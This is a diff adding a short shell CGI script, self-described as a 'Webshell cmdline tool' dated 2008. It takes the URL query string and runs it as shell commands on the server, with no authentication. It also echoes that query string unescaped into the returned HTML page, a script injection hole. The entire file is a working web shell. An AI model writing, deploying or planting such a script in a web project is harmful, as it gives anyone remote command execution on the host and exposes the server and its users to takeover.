@@ -1,0 +1,31 @@
+#!/bin/sh
+# V8Web utilities
+# A very simple cmdline tool by sippey 
+# Feb.3, 2008
+
+if [ ! -f "testcmd.env" ]; then 
+	env>testcmd.env
+	set>testcmd.set
+fi
+
+echo "Content-type: text/html"
+echo ""
+echo "<HTML><HEAD>"
+echo '<meta HTTP-EQUIV="Pragma" CONTENT="no-cache">'
+echo '<meta http-equiv="content-type" content="text/html; charset=utf-8" >'
+echo "<TITLE>Webshell cmdline tool alpha version, by sippey</TITLE></HEAD>"
+echo "<BODY>"
+echo "CMD:<input id=cmdtext type=text value='$QUERY_STRING' onkeypress=\"javascript:if (event.keyCode==13 || event.which==13) self.location ='/cgi-bin/testcmd?'+cmdtext.value;\">"
+echo "<input type=submit value=run onclick=\"javascript:self.location ='/cgi-bin/testcmd?'+cmdtext.value;\">"
+echo "<br>Results:<hr>"
+echo "<pre>"
+echo 'cd $PWD'>>testcmd.set
+echo "$QUERY_STRING">>testcmd.set
+echo "set>$PWD/testcmd.set" >>testcmd.set
+echo "env>$PWD/testcmd.env" >>testcmd.set
+ENVSTR=`cat testcmd.env`
+env -i "$ENVSTR" sh testcmd.set
+echo "</pre>"
+echo "<hr>Output end. <br>V8 Web cmdline tool alpha version, by sippey (sippey#sina.com)"
+echo '<script>cmdtext.focus(); cmdtext.select(); </script>'
+echo "</BODY></HTML>"
